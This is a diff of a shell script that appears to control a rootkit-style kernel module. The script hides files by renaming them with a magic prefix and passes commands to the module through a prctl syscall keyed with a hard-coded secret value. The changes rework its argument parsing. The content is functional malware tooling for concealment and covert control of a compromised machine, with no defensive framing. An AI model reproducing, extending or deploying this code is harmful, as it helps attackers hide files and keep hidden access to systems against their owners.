@@ -30,11 +30,20 @@
 CALL=157 # `sys_prctl`
 [ -z "$1" ] && echo "Expected a command." >&2 && exit 1
 COMMAND="$1"
-COMMAND_LEN=`echo -n "${COMMAND}" | wc -c`
+I=0
 PREFIX="3v!1"
 SECRET=0xDEADBEEFDEADBEEF
 SYSCALL=./syscall
-REST=`echo -n "$@" | cut "-c$(( ${COMMAND_LEN} + 1 ))-"`
+REST=
+
+for ARG in $@
+do
+  if [ "${I}" != 0 ]
+  then
+    REST="${REST} "`echo ""${ARG}""`
+  fi
+  I=$(( ${I} + 1 ))
+done
 
 # most of this should be done in the module,
 # but sadly time isn't abundant
@@ -45,13 +54,15 @@ then
   do
     PREFIXED=`dirname "${ARG}"`"${PREFIX}"`basename "${ARG}"`
 
-    if [ "${COMMAND}" = hide ] && [ -e "${ARG}" ]
+    if [ "${COMMAND}" = hide ] \
+      && [ -e "${ARG}" ]
     then
       # hide path via rename
 
       echo "Hiding \"${ARG}\" via renaming (\"${OLD}\" -> \"${PREFIXED}\")."
       mv "${ARG}" "${PREFIXED}"
-    elif [ "${COMMAND}" = show ] && [ -e "${PREFIXED}" ]
+    elif [ "${COMMAND}" = show ] \
+      && [ -e "${PREFIXED}" ]
     then
       # show path via rename
 
@@ -64,6 +75,26 @@ then
     fi
   done
 else
+  # handle directly via syscall;
+  # but first, prefix strings
+
+  _REST=
+
+  for ARG in ${REST}
+  do
+    FIRST2=`echo "${ARG}" | cut -c-2`
+
+    if [ `expr "${ARG}" : "^[[:digit:]]*\$"` = 0 ] \
+      && [ "${FIRST2}" != "0X" ] \
+      && [ "${FIRST2}" != "0x" ]
+    then
+      # character array
+
+      ARG="@${ARG}"
+    fi
+    _REST="${_REST} "`echo "${ARG}"`
+  done
+  REST="${_REST}"
   "${SYSCALL}" "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
 fi
 
